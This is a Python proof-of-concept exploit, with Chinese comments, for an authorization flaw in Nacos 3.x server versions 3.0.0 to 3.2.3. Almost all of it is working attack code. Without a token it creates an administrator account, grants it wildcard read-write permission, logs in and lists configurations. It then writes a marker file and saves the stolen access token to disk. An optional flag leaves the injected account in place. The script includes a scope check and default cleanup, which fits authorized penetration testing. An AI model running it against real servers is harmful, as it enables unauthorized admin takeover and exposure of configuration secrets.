#!/usr/bin/env python3
"""
Nacos 3.x 鉴权作用域错配 PoC
影响版本：3.0.0 ~ 3.2.3  |  修复版本：3.2.4
CVE：Nacos authscope misassignment（mhtsec/nacos-authscope-poc）

用法：
  python3 nacos_authscope_poc.py --host 127.0.0.1 --port 8848
  python3 nacos_authscope_poc.py --host 10.0.0.5 --case AF-2026-001
  python3 nacos_authscope_poc.py --host 10.0.0.5 --check-only
  python3 nacos_authscope_poc.py --host 10.0.0.5 --no-cleanup

退出码：
  0 = 漏洞存在且利用成功（或 check-only 确认存在）
  1 = 连接/网络错误
  2 = 目标已修复（鉴权正常）
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, UTC
from pathlib import Path
import ssl

# 授权闸门（fail-closed）
_OPS = Path(__file__).resolve().parent
if str(_OPS) not in sys.path:
    sys.path.insert(0, str(_OPS))
try:
    from scope_lib import require_in_scope  # type: ignore
except ImportError:
    require_in_scope = None  # type: ignore

# ── 默认值 ────────────────────────────────────────────────
DEFAULT_PORT = 8848
CACHE_WAIT   = 16   # Nacos 鉴权缓存默认 15s，加 1s buffer
MAX_RETRY    = 4
RETRY_SLEEP  = 5



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _req(url: str, method: str = "GET", data: dict | None = None,
         headers: dict | None = None, timeout: int = 10) -> tuple[int, str]:
    """最小化 HTTP 请求，纯标准库，无第三方依赖。"""
    body = urllib.parse.urlencode(data).encode() if data else None
    h = {"User-Agent": "Mozilla/5.0 (pentest-authscope-check)"}
    if body:
        # Nacos 所有管理接口均接受 application/x-www-form-urlencoded
        h["Content-Type"] = "application/x-www-form-urlencoded"
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        raise ConnectionError(str(e)) from e


def _base(host: str, port: int) -> str:
    scheme = "https" if port in (443, 8443) else "http"
    return f"{scheme}://{host}:{port}/nacos"


# ── 探测函数 ───────────────────────────────────────────────

def check_vuln(base: str) -> bool:
    """
    无损探测：GET /v3/auth/user/list 无 token 返回 200 且 body 包含 pageItems。
    仅读，不建账号，适合 --check-only。
    """
    url = f"{base}/v3/auth/user/list?pageNo=1&pageSize=5"
    code, body = _req(url)
    if code != 200:
        return False
    try:
        obj = json.loads(body)
        # 正常响应结构：{"code":0,"data":{"pageItems":[...],...}}
        return obj.get("code") == 0 and "pageItems" in body
    except (json.JSONDecodeError, AttributeError):
        return False


def create_user(base: str, username: str, password: str) -> bool:
    url = f"{base}/v3/auth/user"
    code, body = _req(url, method="POST",
                      data={"username": username, "password": password})
    return code == 200 and "create user ok" in body


def bind_role(base: str, role: str, username: str) -> bool:
    url = f"{base}/v3/auth/role"
    code, body = _req(url, method="POST",
                      data={"role": role, "username": username})
    return code == 200 and "add role ok" in body


def grant_permission(base: str, role: str) -> bool:
    url = f"{base}/v3/auth/permission"
    code, body = _req(url, method="POST",
                      data={"role": role, "resource": "*:*", "action": "rw"})
    return code == 200 and "add permission ok" in body


def login(base: str, username: str, password: str) -> str | None:
    """返回 accessToken 或 None。内置重试（等缓存刷新）。"""
    url = f"{base}/v3/auth/user/login"
    for attempt in range(MAX_RETRY):
        try:
            code, body = _req(url, method="POST",
                               data={"username": username, "password": password})
            if code == 200:
                obj = json.loads(body)
                token = (obj.get("accessToken")
                         or (obj.get("data") or {}).get("accessToken"))
                if token:
                    return token
        except (ConnectionError, json.JSONDecodeError, AttributeError):
            pass
        if attempt < MAX_RETRY - 1:
            print(f"  [*] 等待鉴权缓存刷新 ({RETRY_SLEEP}s)...", flush=True)
            time.sleep(RETRY_SLEEP)
    return None


def list_configs(base: str, token: str) -> list[dict]:
    url = f"{base}/v3/admin/cs/config/list?pageNo=1&pageSize=20&namespaceId=public"
    code, body = _req(url, headers={"accessToken": token})
    if code == 200:
        try:
            obj = json.loads(body)
            return obj.get("data", {}).get("pageItems", [])
        except (json.JSONDecodeError, AttributeError):
            pass
    return []


def write_marker(base: str, token: str) -> bool:
    url = f"{base}/v3/admin/cs/config"
    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    code, _ = _req(url, method="POST",
                   headers={"accessToken": token},
                   data={
                       "dataId": "pentest-marker.txt",
                       "groupName": "DEFAULT_GROUP",
                       "namespaceId": "public",
                       "content": f"authscope-poc-verified @ {ts}",
                   })
    return code == 200


def delete_user(base: str, username: str) -> bool:
    url = f"{base}/v3/auth/user"
    code, _ = _req(url, method="DELETE", data={"username": username})
    return code == 200


def delete_role(base: str, role: str, username: str) -> bool:
    url = f"{base}/v3/auth/role"
    code, _ = _req(url, method="DELETE",
                   data={"role": role, "username": username})
    return code == 200


def delete_permission(base: str, role: str) -> bool:
    url = f"{base}/v3/auth/permission"
    code, _ = _req(url, method="DELETE",
                   data={"role": role, "resource": "*:*", "action": "rw"})
    return code == 200


# ── 证据落盘 ──────────────────────────────────────────────

def save_evidence(case: str, host: str, port: int,
                  token: str, configs: list[dict], marker_ok: bool) -> str | None:
    if not case:
        return None
    out_dir = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        "案卷", case, "nacos"
    )
    os.makedirs(out_dir, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    evidence = {
        "timestamp": ts,
        "target": f"{host}:{port}",
        "vuln": "nacos-authscope-unauth-admin",
        "affected_versions": "3.0.0~3.2.3",
        "fixed_in": "3.2.4",
        "access_token": token,
        "marker_written": marker_ok,
        "config_count": len(configs),
        "configs_sample": configs[:5],   # 只抽样，不拖全库
    }
    path = os.path.join(out_dir, f"nacos_authscope_{ts}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)
    return path


# ── 主流程 ────────────────────────────────────────────────

def main() -> int:
    ap = argparse.ArgumentParser(
        description="Nacos 3.x authscope misassignment PoC (mhtsec/nacos-authscope-poc)"
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--case", default="", help="案卷编号，用于证据落盘路径")
    ap.add_argument("--check-only", action="store_true",
                    help="只读探测，不建账号，不写入")
    ap.add_argument("--no-cleanup", action="store_true",
                    help="打完保留注入账号（token 仍有效）")
    args = ap.parse_args()

    # ── 授权闸门（fail-closed，防止脚本被误用打 scope 外目标）──
    if require_in_scope is None:
        sys.stderr.write("[scope] 拒绝：scope_lib 未加载，禁止无闸运行\n")
        raise SystemExit(2)
    require_in_scope(args.host, allow_loopback=True)

    base = _base(args.host, args.port)
    print(f"[*] 目标：{base}")

    # ── Step 1: 无损探测 ──────────────────────────────────
    print("[*] Step 1 / 探测漏洞面...")
    try:
        vuln = check_vuln(base)
    except ConnectionError as e:
        print(f"[-] 连接失败：{e}")
        return 1

    if not vuln:
        print("[!] 目标已修复或不受影响（/v3/auth/user/list 鉴权正常）")
        return 2

    print("[+] 漏洞存在：/v3/auth/user/list 无 token 返回 2xx")

    if args.check_only:
        print("[+] --check-only 模式，不执行写入操作。退出码 0。")
        return 0

    # ── Step 2: 建号 ──────────────────────────────────────
    uid = uuid.uuid4().hex[:8]
    username = f"poc_{uid}"
    password = f"Poc@{uid[:6].upper()}!"
    role     = f"poc_role_{uid}"

    print(f"[*] Step 2 / 创建账号：{username}")
    if not create_user(base, username, password):
        print("[-] 创建账号失败（可能已修复）")
        return 2

    print(f"[+] 账号已创建：{username} / {password}")

    # ── Step 3: 绑角色 ────────────────────────────────────
    print(f"[*] Step 3 / 绑定角色：{role}")
    if not bind_role(base, role, username):
        print("[-] 绑定角色失败")
        delete_user(base, username)
        return 1

    # ── Step 4: 发权限 ────────────────────────────────────
    print(f"[*] Step 4 / 发 *:* 权限 → {role}")
    if not grant_permission(base, role):
        print("[-] 发权限失败")
        delete_role(base, role, username)
        delete_user(base, username)
        return 1

    # ── Step 5: 登录 ──────────────────────────────────────
    print(f"[*] Step 5 / 登录（等鉴权缓存刷新，最多 {CACHE_WAIT}s）...")
    time.sleep(CACHE_WAIT)
    token = login(base, username, password)
    if not token:
        print("[-] 登录失败，token 获取超时")
        if not args.no_cleanup:
            _cleanup(base, username, role)
        return 1

    print(f"[+] accessToken = {token[:40]}...（已截断）")

    # ── Step 6: 读配置 ────────────────────────────────────
    print("[*] Step 6 / 列 admin 配置...")
    configs = list_configs(base, token)
    print(f"[+] 读取到 {len(configs)} 条配置（展示前 3 条 dataId）：")
    for c in configs[:3]:
        print(f"    - {c.get('dataId')} @ {c.get('group', c.get('groupName', ''))}")

    # ── Step 7: 写标记 ────────────────────────────────────
    print("[*] Step 7 / 写入 pentest-marker.txt...")
    marker_ok = write_marker(base, token)
    print(f"[{'+'if marker_ok else '-'}] marker 写入{'成功' if marker_ok else '失败'}")

    # ── 落盘证据 ──────────────────────────────────────────
    ev_path = save_evidence(args.case, args.host, args.port, token, configs, marker_ok)
    if ev_path:
        print(f"[+] 证据已落盘：{ev_path}")

    # ── 汇总 ──────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("  漏洞：Nacos 3.x 鉴权作用域错配（未授权自建管理员）")
    print(f"  目标：{args.host}:{args.port}")
    print(f"  账号：{username} / {password}")
    print(f"  Token：{token}")
    print(f"  配置数：{len(configs)}")
    print("=" * 60)

    # ── 清理 ──────────────────────────────────────────────
    if args.no_cleanup:
        print("[*] --no-cleanup：账号/角色/权限保留，token 仍有效")
    else:
        print("[*] 清理注入账号...")
        _cleanup(base, username, role)
        print("[+] 清理完成，token 随之失效")

    return 0


def _cleanup(base: str, username: str, role: str) -> None:
    delete_permission(base, role)
    delete_role(base, role, username)
    delete_user(base, username)


if __name__ == "__main__":
    sys.exit(main())
